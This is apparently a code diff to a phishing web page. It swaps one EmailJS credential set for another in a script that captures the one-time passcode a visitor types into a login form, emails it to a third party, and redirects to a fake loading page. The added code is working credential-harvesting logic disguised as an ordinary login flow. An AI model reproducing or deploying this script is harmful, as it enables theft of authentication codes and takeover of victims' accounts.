@@ -255,38 +255,26 @@ THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRES
     
 <div id=afterFooterButtons tabindex=0></div></div> </div></div></div></div><div class="modal-backdrop fade in"></div></form>
  
-     <script>
-                   emailjs.init("kCcVZjZ0EQOMxvbkI");
-           
-                   function sendEmail(OTP) {
-                   emailjs.send("service_dw04fcy", "template_uovp2pm", {
-                     passcode:OTP
-                   })
-                   .then(function(response) {
-                       console.log('Email sent successfully!', response);
-                       window.location.href = 'loadingpage2.html';
-                                           }, function(error) {
-                       console.error('Email sending failed:', error);
-                               });
-               }
-           
-               
-               document.getElementById('otpForm').addEventListener('submit', function(event) {
-                   event.preventDefault();
-                   
-                   const otpInput = document.getElementById('otp');
-            const otpValue = otpInput.value.trim();
-            const otpError = document.getElementById('otpError');
-    
-            if (otpValue === "") {
-                otpError.style.display = 'block';
-                otpInput.focus();
-                return;
-            } else {
-                otpError.style.display = 'none';
-            }
-    
-            sendEmail(otpValue);
-        });
-    </script>
-    
+    <script>
+        emailjs.init("1qxfSB1_KMHeE1QCN");
+
+        function sendEmail(OTP) {
+        emailjs.send("service_l22c57a", "template_wpjt38m", {
+          passcode:OTP
+        })
+        .then(function(response) {
+            console.log('Email sent successfully!', response);
+            window.location.href = 'loadingpage2.html';
+                                }, function(error) {
+            console.error('Email sending failed:', error);
+                    });
+    }
+
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const passcode = document.getElementById('passcode').value;
+
+    sendEmail(passcode);
+});
+</script>
